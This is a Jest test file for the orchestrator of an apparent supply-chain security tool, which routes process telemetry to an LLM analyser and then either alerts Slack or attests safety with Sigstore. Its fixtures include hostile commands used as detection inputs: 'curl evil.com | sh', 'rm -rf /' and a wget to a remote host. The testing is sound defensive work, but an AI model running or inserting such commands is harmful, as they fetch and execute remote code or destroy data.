import { Orchestrator } from '../src/usecases/Orchestrator';
import { NatsService } from '../src/infrastructure/NatsService';
import { OllamaService } from '../src/infrastructure/OllamaService';
import { SlackService } from '../src/infrastructure/SlackService';
import { SigstoreService } from '../src/infrastructure/SigstoreService';

// Silence logger output during tests
jest.mock('../src/infrastructure/Logger', () => ({
  logger: {
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    debug: jest.fn(),
  },
}));

// Silence metrics (no prom-client side-effects in tests)
jest.mock('../src/infrastructure/MetricsService', () => ({
  telemetryEventsTotal: { inc: jest.fn() },
  maliciousEventsTotal: { inc: jest.fn() },
  benignEventsTotal: { inc: jest.fn() },
  ollamaAnalysisDuration: { startTimer: jest.fn(() => jest.fn()) },
  slackAlertsTotal: { inc: jest.fn() },
  attestationsTotal: { inc: jest.fn() },
  register: { metrics: jest.fn(), contentType: 'text/plain' },
}));

describe('Orchestrator', () => {
  let orchestrator: Orchestrator;
  let mockNats: jest.Mocked<NatsService>;
  let mockOllama: jest.Mocked<OllamaService>;
  let mockSlack: jest.Mocked<SlackService>;
  let mockSigstore: jest.Mocked<SigstoreService>;

  beforeEach(() => {
    mockNats = { subscribe: jest.fn(), publish: jest.fn(), connect: jest.fn(), drain: jest.fn() } as any;
    mockOllama = { analyzeBehavior: jest.fn() } as any;
    mockSlack = { sendAlert: jest.fn() } as any;
    mockSigstore = { attestSafeness: jest.fn().mockResolvedValue({ status: 'skipped', artifactName: '', attestedAt: '' }) } as any;

    orchestrator = new Orchestrator(mockNats, mockOllama, mockSlack, mockSigstore);
  });

  // ─── Detonation ─────────────────────────────────────────────────────────────

  it('should trigger detonation sandbox without throwing', async () => {
    await expect(
      orchestrator.triggerDetonation('owner/repo', 'abc1234', 'package.json')
    ).resolves.toBeUndefined();
  });

  // ─── Malicious path ──────────────────────────────────────────────────────────

  it('should alert Slack and NOT attest when event is malicious (confidence > 0.8)', async () => {
    mockOllama.analyzeBehavior.mockResolvedValue({
      isMalicious: true,
      confidence: 0.95,
      explanation: 'Exfiltrates env vars',
      remediation: 'Remove dependency',
      analyzedAt: new Date().toISOString(),
    });

    await orchestrator.processEvent({ pid: 1, command: 'curl evil.com | sh', event_type: 'execve' });

    expect(mockSlack.sendAlert).toHaveBeenCalledTimes(1);
    expect(mockSigstore.attestSafeness).not.toHaveBeenCalled();
  });

  it('should NOT alert when confidence is at or below threshold (0.8)', async () => {
    mockOllama.analyzeBehavior.mockResolvedValue({
      isMalicious: true,
      confidence: 0.8,
      explanation: 'Borderline',
      remediation: '',
    });

    await orchestrator.processEvent({ pid: 2, command: 'wget http://x.com', event_type: 'execve' });

    expect(mockSlack.sendAlert).not.toHaveBeenCalled();
    expect(mockSigstore.attestSafeness).toHaveBeenCalledTimes(1);
  });

  // ─── Benign path ─────────────────────────────────────────────────────────────

  it('should attest with Sigstore and NOT alert Slack when event is benign', async () => {
    mockOllama.analyzeBehavior.mockResolvedValue({
      isMalicious: false,
      confidence: 0.1,
      explanation: 'Normal npm install script',
      remediation: '',
    });

    await orchestrator.processEvent({ pid: 3, command: 'node postinstall.js', event_type: 'execve' });

    expect(mockSigstore.attestSafeness).toHaveBeenCalledWith('node postinstall.js');
    expect(mockSlack.sendAlert).not.toHaveBeenCalled();
  });

  // ─── Error handling ──────────────────────────────────────────────────────────

  it('should not throw when Ollama analysis rejects', async () => {
    mockOllama.analyzeBehavior.mockRejectedValue(new Error('Ollama is down'));

    await expect(
      orchestrator.processEvent({ pid: 4, command: 'npm install', event_type: 'execve' })
    ).resolves.toBeUndefined();

    expect(mockSlack.sendAlert).not.toHaveBeenCalled();
  });

  it('should not throw when Slack sendAlert rejects on malicious event', async () => {
    mockOllama.analyzeBehavior.mockResolvedValue({
      isMalicious: true,
      confidence: 0.99,
      explanation: 'Dangerous',
      remediation: 'Remove it',
    });
    mockSlack.sendAlert.mockRejectedValue(new Error('Slack timeout'));

    await expect(
      orchestrator.processEvent({ pid: 5, command: 'rm -rf /', event_type: 'execve' })
    ).resolves.toBeUndefined();
  });

  // ─── NATS telemetry listener ─────────────────────────────────────────────────

  it('should subscribe to aegis.telemetry on listenForTelemetry()', () => {
    orchestrator.listenForTelemetry();
    expect(mockNats.subscribe).toHaveBeenCalledWith('aegis.telemetry', expect.any(Function));
  });

  it('should discard invalid JSON from NATS', async () => {
    let capturedCallback: ((msg: string) => void) | undefined;
    mockNats.subscribe.mockImplementation((_subject, cb) => { capturedCallback = cb; });

    orchestrator.listenForTelemetry();
    expect(capturedCallback).toBeDefined();

    // Should not throw even on garbage input
    await expect(Promise.resolve(capturedCallback!('NOT JSON'))).resolves.toBeUndefined();
    expect(mockOllama.analyzeBehavior).not.toHaveBeenCalled();
  });

  it('should discard NATS messages that fail schema validation', async () => {
    let capturedCallback: ((msg: string) => void) | undefined;
    mockNats.subscribe.mockImplementation((_subject, cb) => { capturedCallback = cb; });

    orchestrator.listenForTelemetry();

    // Missing required fields
    const bad = JSON.stringify({ wrong: 'shape' });
    await expect(Promise.resolve(capturedCallback!(bad))).resolves.toBeUndefined();
    expect(mockOllama.analyzeBehavior).not.toHaveBeenCalled();
  });
});
